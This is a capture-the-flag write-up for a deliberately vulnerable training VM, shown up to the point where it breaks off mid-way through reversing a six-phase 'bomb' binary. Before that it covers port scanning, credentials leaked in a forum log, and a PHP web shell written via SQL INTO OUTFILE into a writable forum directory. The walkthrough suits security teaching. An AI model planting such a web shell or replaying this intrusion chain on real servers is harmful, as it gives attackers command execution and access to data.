# Writeup 1 - Main Challenge

<br>

<details>
<summary><h2>Step 0 - Find the iso ip</h2></summary>

To start, you need to know the ip iso to connect to it. Since we've configured the VM to be in the local network,
we look at our network interfaces:
```shell
host:~$ ip a
...
3: vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
       valid_lft forever preferred_lft forever
...
```
So we can deduce that the ip will be in range `192.168.56.2-255`, let's use `nmap` to find it !
```shell
host:~$ nmap 192.168.56.2-255
...
Nmap scan report for 192.168.56.7
Host is up (0.00019s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
...
```
Yes, We got it. So we can connect through the iso on ip `192.168.56.7`.
> Note: All commands in this topic are executed through the IP address "192.168.56.7".
> Your iso's ip address may be different, so modify the commands accordingly.

<br>

</details>


<details>
<summary><h2>Step 1 - find a vulnerable doorway.</h2></summary>

Now, we know the ip and all open ports. Let's enumerate them:
<br>
-  `21` and `22` are respectively `ftp` and `ssh` ports and we don't have any credential so there aren't useful for the moment.
  
-  On port `80` (http port) we find an interesting information :

![http](images/http.png)

As we deduce the http/https ports might be the path we were expecting to enter the iso. We list the possible paths using `dirb`.

```shell
host:~$ dirb http://192.168.56.7
...
==> DIRECTORY: http://192.168.56.7/fonts/
+ http://192.168.56.7/forum (CODE:403|SIZE:285)                              
+ http://192.168.56.7/index.html (CODE:200|SIZE:1025)                        
+ http://192.168.56.7/server-status (CODE:403|SIZE:293)
...                     
```
We found nothing useful on `80` let's test the `443` port

```shell
host:~$ dirb https://192.168.56.7
...
==> DIRECTORY: https://192.168.56.7/forum/
==> DIRECTORY: https://192.168.56.7/phpmyadmin/
...                     
==> DIRECTORY: https://192.168.56.7/webmail/
...
```
Here we found that we expected, 3 possible doorway: phpmyadmin, webmail (both needed credentials) and ... a private forum with free access to topics !

![forum](images/forum.png)

</details

<br>

<details>
<summary><h2>Step 2 - Inspect topics forum</h2></summary>

by scrolling through the topics for a few minutes, we discover, in the topic `Problem login?`, a line which seems to be a password (`!q\]Ej?*5K5cy*AJ`) entered by mistake in place of a user login... and just after a success logon with the user `lmezard`:

```shell
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
```

Indeed, by testing, we found that it is the `lmezard`'s forum password!
by logging in with lizard's identifiers on the forum page, we now have access to lmezard's personal information,
and we will discover an email address: `laurie@borntosec.net` !

![email_forum](images/email_forum.png)

Now we have a mail, and we deduce that we can use it on a mail server... and there is one on on port `443` !
For the password, `laurie` isn't smart (like a good proportion of the humanity), she's reused the same password.
So, we connect to her mail.

![webmail](images/webmail.png)

<br>

</details>

<details>
<summary><h2>Step 3 - Inspect mail box</h2></summary>

Here, our job is very simple. Just look in the `DB Access` mail for root (`root/Fg-'kKXBj87E:aJ$`) access to the database,
what more could you ask for !

![](images/db_mail.png)

<br>

</details>

<details>
<summary><h2>Step 4 - Inspect Database</h2></summary>

By logging in with the credentials of `root` on the phpmyadmin page, we get the privilege to access the database.
After some research, we found hashed user passwords on the database, but they are difficult to crack (brute force)
because they are salted. However, we find a potential vulnerability in creating a file to exploit a webshell 
using sql injection.

So we create a php file that can run commands as user www-data on the server with this command:
```shell
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```
BUT ! The `/var/www/phpMyAdmin/` directory is not writable...so we need to find a writable directory. After enumerating the port with dirb and long tests, we find a writable directory: `/var/www/forum/templates_c`
```shell
host:~$ dirb https://192.168.56.7 | grep DIRECTORY
...
==> DIRECTORY: https://192.168.56.7/forum/templates_c/
...
```
So we can use this command successfully:
```shell
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

![sql_injection](images/sql_injection.png)

And so, go to the `https://192.168.56.7/forum/templates_c/cmd.php` page with your browser to open a beautiful webshell.
After few minutes of enumeration we found a new `lmezard`'s credentials in `/home/LOOKATME/password` : `lmezard:G!@M6f4Eatau{sF"`

The next step is to find out what service those credentials are being used for...

<br>

</details>

<details>
<summary><h2>Step 5 - Ftp</h2></summary>

We finally found the service the credentials are associated with the service `ftp` on port `21`.
```shell
host:~$ ftp lmezard@192.168.56.7

Connected to 192.168.56.7.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62943|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```
As we see, there are 2 files present, let's get them on the host.
```shell
ftp> get README
local: fun remote: README
229 Entering Extended Passive Mode (|||26123|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*********************************|    96        2.23 MiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (288.46 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||60919|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*********************************|   790 KiB  106.11 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (99.79 MiB/s)

...

host:~$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

host:~$ file fun
fun: POSIX tar archive (GNU)
host:~$ tar -xf fun
host:~$ ls -l ft_fun | head -n10
total 3028
-rw-r----- 1 ammah ammah    26 août  13  2015 00M73.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 01IXJ.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 0564G.pcap
-rw-r----- 1 ammah ammah    27 août  13  2015 05GXI.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 08GIC.pcap
-rw-r----- 1 ammah ammah    28 août  13  2015 08UKO.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 0B2GJ.pcap
-rw-r----- 1 ammah ammah    44 août  13  2015 0D70A.pcap
-rw-r----- 1 ammah ammah    13 août  13  2015 0E2HD.pcap
```

When we look into these files, we find a `main` with some `getme` functions scattered in files
```shell
host:~$ grep -A31 "main" ft_fun/*

ft_fun/BJPCP.pcap:int main() {
ft_fun/BJPCP.pcap-	printf("M");
ft_fun/BJPCP.pcap-	printf("Y");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("P");
ft_fun/BJPCP.pcap-	printf("A");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf("W");
ft_fun/BJPCP.pcap-	printf("O");
ft_fun/BJPCP.pcap-	printf("R");
ft_fun/BJPCP.pcap-	printf("D");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("I");
ft_fun/BJPCP.pcap-	printf("S");
ft_fun/BJPCP.pcap-	printf(":");
ft_fun/BJPCP.pcap-	printf(" ");
ft_fun/BJPCP.pcap-	printf("%c",getme1());
ft_fun/BJPCP.pcap-	printf("%c",getme2());
ft_fun/BJPCP.pcap-	printf("%c",getme3());
ft_fun/BJPCP.pcap-	printf("%c",getme4());
ft_fun/BJPCP.pcap-	printf("%c",getme5());
ft_fun/BJPCP.pcap-	printf("%c",getme6());
ft_fun/BJPCP.pcap-	printf("%c",getme7());
ft_fun/BJPCP.pcap-	printf("%c",getme8());
ft_fun/BJPCP.pcap-	printf("%c",getme9());
ft_fun/BJPCP.pcap-	printf("%c",getme10());
ft_fun/BJPCP.pcap-	printf("%c",getme11());
ft_fun/BJPCP.pcap-	printf("%c",getme12());
ft_fun/BJPCP.pcap-	printf("\n");
ft_fun/BJPCP.pcap-	printf("Now SHA-256 it and submit");
ft_fun/BJPCP.pcap-}

host:~$ grep -A2 "getme" ft_fun/*
...
--
ft_fun/91CD0.pcap:char getme6() {
ft_fun/91CD0.pcap-
ft_fun/91CD0.pcap-//file521
--
ft_fun/B62N4.pcap:char getme3() {
ft_fun/B62N4.pcap-
ft_fun/B62N4.pcap-//file56
--
ft_fun/BJPCP.pcap:char getme8() {
ft_fun/BJPCP.pcap-	return 'w';
ft_fun/BJPCP.pcap-}
--
ft_fun/BJPCP.pcap:char getme9() {
ft_fun/BJPCP.pcap-	return 'n';
ft_fun/BJPCP.pcap-}
--
...

```
When we cat 0T16C.pcap the function was not complete but a comment was present with the file number,
we just had to grep the following file to get the rest of the function. Here is an example:
```shell
host:~$ cat 0T16C.pcap
char getme4() {

//file115%

host:~$ grep "//file116" *
7DT5Q.pcap://file116

host:~$ cat 7DT5Q.pcap
	return 'a';

//file116%

host:~$ grep "//file117" *
HEQ6R.pcap://file117

host:~$ cat HEQ6R.pcap
}

//file117%
```
So that's the trick ! Copy `laurie.sh` and `laurie.py` in `ft_fun` file and run `laurie.sh` to get the ssh laurie's password.
We are know into the server !
```shell

host:~$ cp Security-Pentest-Part-II/scripts/laurie.* ft_fun/. 
host:~$ (cd ft_fun && bash laurie.sh) 
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

<br>

</details>

## Step 06 - Defuse the bomb

After logon to `laurie` user uing ssh, we find two files on `HOME` :

```shell
laurie@BornToSecHackMe:~$ ls -l
total 27
-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb

laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

BOOM!!!
The bomb has blown up.

laurie@BornToSecHackMe:~$ ./bomb file file
Usage: ./bomb [<input_file>]
```

So, we have to find 6 different passwords that we can put into a file (one password by line)
The only way to exploit this binary is to disassembly it using GDB (with [GEF](https://github.com/hugsy/gef) plugin):
<br>
First of all, let's disassembly `main` function :

```shell
   0x08048a5b <+171>:	call   0x8048b20 <phase_1>
   0x08048a60 <+176>:	call   0x804952c <phase_defused>
   ...
   0x08048a7e <+206>:	call   0x8048b48 <phase_2>
   0x08048a83 <+211>:	call   0x804952c <phase_defused>
   ...
   0x08048aa1 <+241>:	call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:	call   0x804952c <phase_defused>
   ...
   0x08048ac4 <+276>:	call   0x8048ce0 <phase_4>
   0x08048ac9 <+281>:	call   0x804952c <phase_defused>
   ...
   0x08048ae7 <+311>:	call   0x8048d2c <phase_5>
   0x08048aec <+316>:	call   0x804952c <phase_defused>
   ...
   0x08048b0a <+346>:	call   0x8048d98 <phase_6>
   0x08048b0f <+351>:	call   0x804952c <phase_defused
   ...
```

<br>

We see that each stage/phase have a dedicate function :

<details>
<summary><h3>phase_1</h3></summary>
	
```shell
gef➤  disass phase_1
Dump of assembler code for function phase_1:
   ...
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   ...    
```

We understood that if first input string is not equal to another,
`eax` ragister will not equal to zero, and so the bomb will explose.
We just have to check which argument is given to `strings_not_equal` function.
```shell
gef> disass strings_not_equal
Dump of assembler code for function strings_not_equal:
   ...
   0x08049039 <+9>:	mov    esi,DWORD PTR [ebp+0x8]
   0x0804903c <+12>:	mov    edi,DWORD PTR [ebp+0xc]
   0x0804903f <+15>:	add    esp,0xfffffff4
   ...
gef> b *0x0804903f
Breakpoint 1 at 0x804903f
gef> r
Starting program: /home/ammah/Downloads/bomb 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

Breakpoint 1, 0x0804903f in strings_not_equal ()
...
$esi   : 0x0804b680  →  "test"
$edi   : 0x080497c0  →  "Public speaking is very easy."
...
```
We find the first password `Public speaking is very easy.` and put it in file `pass`
```shell
echo 'Public speaking is very easy.' > pass
```

<br>

</details>

<details>
<summary><h3>phase_2</h3></summary>
	
```shell
gef> disass phase_2
...
 0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    esp,0x10
   0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    ebx,0x1
   0x08048b73 <+43>:	lea    esi,[ebp-0x18]
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    ebx
   0x08048b89 <+65>:	cmp    ebx,0x5
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
...
```
As we see, there are two step to bypass:
- after call to `read_six_numbers` function
- on the loop between `<phase_2+46>` and `<phase_2+68>`

<br>

Let's go deeper un `read_six_number`
```shell
gef> disass read_six_number
   ...
   0x08048fff <+39>:	call   0x8048860 <sscanf@plt>
   0x08049004 <+44>:	add    esp,0x20
   0x08049007 <+47>:	cmp    eax,0x5
   0x0804900a <+50>:	jg     0x8049011 <read_six_numbers+57>
   0x0804900c <+52>:	call   0x80494fc <explode_bomb>
   ...
gef> b *0x08048fff
Breakpoint 1 at 0x8048fff
gef➤  r pass
Starting program: /home/ammah/Downloads/bomb pass
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
test


Breakpoint 2, 0x08048fff in read_six_numbers ()
...
─────────────────────────────────────────────────────────────────── stack ────
0xffffcee0│+0x0000: 0x0804b6d0  →  "test"	 ← $esp
0xffffcee4│+0x0004: 0x08049b1b  →  "%d %d %d %d %d %d"
...
```
On break just on instruction `call   0x8048860 <sscanf@plt>`, the argument to sscanf are on the stack:
- In `esp`, the argument we input.
- In `esp+4` the format of the expected input string.

if sscanf don't find, a least, 6 numbers in our input string, the bomb explodes.

We know now what is the format of the string, let's go back to the `phase_2` function to find out which numbers to input.

<br>

After the execution of `read_six_numbers`, this instruction `cmp DWORD PTR [ebp-0x18],0x1` conditions the explosion or not of the bomb.
```shell
gef➤  b *0x08048b63
Breakpoint 5 at 0x8048b63
gef➤  r pass
Starting program: /home/ammah/Downloads/bomb pass
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
1 2 3 4 5 6

Breakpoint 5, 0x08048b63 in phase_2 ()
...
─────────────────────────────────────────────────────────────────── stack ────
0xffffcf20│+0x0000: 0xffffd034  →  0xffffd22a  →  "/home/ammah/Downloads/bomb" ← $esp
0xffffcf24│+0x0004: 0xffffd034  →  0xffffd22a  →  "/home/ammah/Downloads/bomb"
0xffffcf28│+0x0008: 0xffffcf58  →  0xffffcf78  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
0xffffcf2c│+0x000c: 0x08049226  →  <read_line+42> add esp, 0x10
0xffffcf30│+0x0010: 0x00000001
0xffffcf34│+0x0014: 0x00000002
0xffffcf38│+0x0018: 0x00000003
0xffffcf3c│+0x001c: 0x00000004
0xffffcf40│+0x0020: 0x00000005
0xffffcf44│+0x0024: 0x00000006
0xffffcf48│+0x0028: 0xffffcf78  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000 ← $ebp
...
...
```
So `[ebp-0x18]` point to the first number of the input string.
we know now that the first number is `1`.

<br>

The final point is the loop between `<phase_2+46>` and `<phase_2+68>`, it's the key to understand the second pass:

To initialise the loop variables we have two instruction :
- `mov    ebx,0x1` : initialize `ebx` to value `1`
- `lea    esi,[ebp-0x18]` : initialize `esi` to point to the first number of the input string.

We know also that `ebx` will be increment on each loop and the loop stop with success when `ebx == 6`...as the count of number !

the loop will inform us of the rest of numbers:
```shell
...
   0x08048b76 <+46>:	lea    eax,[ebx+0x1]
   0x08048b79 <+49>:	imul   eax,DWORD PTR [esi+ebx*4-0x4]
   0x08048b7e <+54>:	cmp    DWORD PTR [esi+ebx*4],eax
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
...
```
`lea    eax,[ebx+0x1]`   ->   **eax = ebx+1** 

`imul   eax,DWORD PTR [esi+ebx*4-0x4]`   ->   **eax = eax * inputString[ebx - 1]**

`cmp    DWORD PTR [esi+ebx*4],eax` / `je  0x8048b88 <phase_2+64>`   ->   **if eax == inputString[ebx]**

`call   0x80494fc <explode_bomb>`    ->   **else explode_bomb**

For be simple, if we consider the input string as an array, each number is
the factorial on his `index + 1`   ->   **1 2 6 24 120 720**
```shell
echo '1 2 6 24 120 720' >> pass
```

<br>

</details>

<details>
<summary><h3>phase_3</h3></summary>

```shell
gef> disass phase_3
...
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    esp,0x20
   0x08048bbf <+39>:	cmp    eax,0x2
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
   0x08048bdd <+69>:	lea    esi,[esi+0x0]
   0x08048be0 <+72>:	mov    bl,0x71
   0x08048be2 <+74>:	cmp    DWORD PTR [ebp-0x4],0x309
   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:	lea    esi,[esi+eiz*1+0x0]
   0x08048c00 <+104>:	mov    bl,0x62
   0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:	mov    bl,0x62
   0x08048c18 <+128>:	cmp    DWORD PTR [ebp-0x4],0x2f3
   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:	mov    bl,0x6b
   0x08048c2a <+146>:	cmp    DWORD PTR [ebp-0x4],0xfb
   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:	lea    esi,[esi+0x0]
   0x08048c40 <+168>:	mov    bl,0x6f
   0x08048c42 <+170>:	cmp    DWORD PTR [ebp-0x4],0xa0
   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:	mov    bl,0x74
   0x08048c54 <+188>:	cmp    DWORD PTR [ebp-0x4],0x1ca
   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:	mov    bl,0x76
   0x08048c66 <+206>:	cmp    DWORD PTR [ebp-0x4],0x30c
   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:	mov    bl,0x62
   0x08048c78 <+224>:	cmp    DWORD PTR [ebp-0x4],0x20c
   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:	mov    bl,0x78
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
...
```

As in the previous phase, the input string is read by `sscanf` and its return
value is check to continue execution. We know there at least 3 arguments
(`cmp eax,0x2`) so disassemble it to find the correct string format.

```shell
gef➤  b *0x08048bb7
Breakpoint 1 at 0x8048bb7
gef➤  r pass
Starting program: /home/ammah/Downloads/bomb pass
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
test

Breakpoint 1, 0x08048bb7 in phase_3 ()
...
─────────────────────────────────────────────────────────────────── stack ────
0xffffcf10│+0x0000: 0x0804b720  →  "test"	 ← $esp
0xffffcf14│+0x0004: 0x080497de  →  "%d %c %d"
...
```

<br>

We know now the correct format string : `%d %c %d`. Let's continue with this set
of instructions :
```shell
0x08048bc9 <+49>:	cmp    DWORD PTR [ebp-0xc],0x7
0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
...
0x08048c88 <+240>:	mov    bl,0x78
0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
```
We therefore understand that the first number `ebx-0xc` from our input string
(the fields read by `sscanf` are on the stack) must be a number less than or
equal to 7.

<br>

the next step in this phase is right after in this set of instructions :
```shell
0x08048bd3 <+59>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048bd6 <+62>:	jmp    DWORD PTR [eax*4+0x80497e8]
```
this means that `eax`, which takes the value of the first field, is multiplied
by 4. And it is this offset which is added to the address `0x80497e8`.
Knowing that, let's look at different values behind `[eax*4+0x80497e8]`:
```shell
gef➤  x/x *0x80497e8
0x8048be0 <phase_3+72>:	0x7d8171b3
gef➤  x/x *0x80497ec
0x8048c00 <phase_3+104>:	0x7d8162b3
gef➤  x/x *0x80497f0
0x8048c16 <phase_3+126>:	0x7d8162b3
gef➤  x/x *0x80497f4
0x8048c28 <phase_3+144>:	0x7d816bb3
gef➤  x/x *0x80497f8
0x8048c40 <phase_3+168>:	0x7d816fb3
gef➤  x/x *0x80497fc
0x8048c52 <phase_3+186>:	0x7d8174b3
gef➤  x/x *0x8049800
0x8048c64 <phase_3+204>:	0x7d8176b3
gef➤  x/x *0x8049804
0x8048c76 <phase_3+222>:	0x7d8162b3
```
The fact that whatever the possible value of the first field, the rest of
the execution code is of the same type:
```shell
0x08048c40 <+168>:	mov    bl,<value1>
0x08048c42 <+170>:	cmp    DWORD PTR [ebp-0x4],<value2>
0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
```
and all possibilities redirect to these instructions :
```shell
0x08048c8f <+247>:	cmp    bl,BYTE PTR [ebp-0x5]
0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
```

So there is a different set of fields for each first field value, but the index
on `README` present in `HOME` of laurie, will give us the first and the second
target value: `2` and `b`.

Knowing this, the only possible set of field is : **2 b 755**
```shell
echo '2 b 755' >> pass
```

</details>

<details>
<summary><h3>phase_4</h3></summary>

```shell
gef➤  disass phase_4
Dump of assembler code for function phase_4:
   ...
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:	add    esp,0x10
   0x08048cfe <+30>:	cmp    eax,0x1
   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:	add    esp,0xfffffff4
   0x08048d11 <+49>:	mov    eax,DWORD PTR [ebp-0x4]
   0x08048d14 <+52>:	push   eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    esp,0x10
   0x08048d1d <+61>:	cmp    eax,0x37
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:	mov    esp,ebp
   ...
```

As in the previous phase, the input string is read by `sscanf` and its return
value is check to continue execution. We know there is one argument
(`cmp eax,0x1`) so disassemble it to find the correct string format.


```shell
gef> b *0x08048cf6
gef➤  r pass
Starting program: /home/ammah/Downloads/bomb pass
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
test

Breakpoint 1, 0x08048cf6 in phase_4 ()
...
─────────────────────────────────────────────────────────── stack ────
0xffffcf20│+0x0000: 0x0804b770  →  "test"	 ← $esp
0xffffcf24│+0x0004: 0x08049808  →  0x67006425 ("%d"?)
...
```

We know now the correct format string : `%d`. Let's continue with this set
of instructions :
```shell
   0x08048d03 <+35>:	cmp    DWORD PTR [ebp-0x4],0x0
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:	add    esp,0xfffffff4
```

We therefore understand that the number `ebx-0x4` from our input string
(the field read by `sscanf` is on the stack) must be a number greater than 0.

<br>

the next step in this phase is right after in this set of instructions :
```shell
   0x08048d11 <+49>:	mov    eax,DWORD PTR [ebp-0x4]
   0x08048d14 <+52>:	push   eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    esp,0x10
   0x08048d1d <+61>:	cmp    eax,0x37
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:	mov    esp,ebp
   0x08048d29 <+73>:	pop    ebp
   0x08048d2a <+74>:	ret
```

We can see that the input number is pushed onto the stack and the return of
the `func4` function must be 55 (`0x37`) to succeed. 

<br>

Knowing this, Let's disassemble `func4` to understand how it works.

```shell
gef➤  disass func4
Dump of assembler code for function func4:
   0x08048ca0 <+0>:	push   ebp
   0x08048ca1 <+1>:	mov    ebp,esp
   0x08048ca3 <+3>:	sub    esp,0x10
   0x08048ca6 <+6>:	push   esi
   0x08048ca7 <+7>:	push   ebx
   0x08048ca8 <+8>:	mov    ebx,DWORD PTR [ebp+0x8]
   0x08048cab <+11>:	cmp    ebx,0x1
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:	add    esp,0xfffffff4
   0x08048cb3 <+19>:	lea    eax,[ebx-0x1]
   0x08048cb6 <+22>:	push   eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
   0x08048cbc <+28>:	mov    esi,eax
   0x08048cbe <+30>:	add    esp,0xfffffff4
   0x08048cc1 <+33>:	lea    eax,[ebx-0x2]
   0x08048cc4 <+36>:	push   eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
   0x08048cca <+42>:	add    eax,esi
   0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
   0x08048cce <+46>:	mov    esi,esi
   0x08048cd0 <+48>:	mov    eax,0x1
   0x08048cd5 <+53>:	lea    esp,[ebp-0x18]
   0x08048cd8 <+56>:	pop    ebx
   0x08048cd9 <+57>:	pop    esi
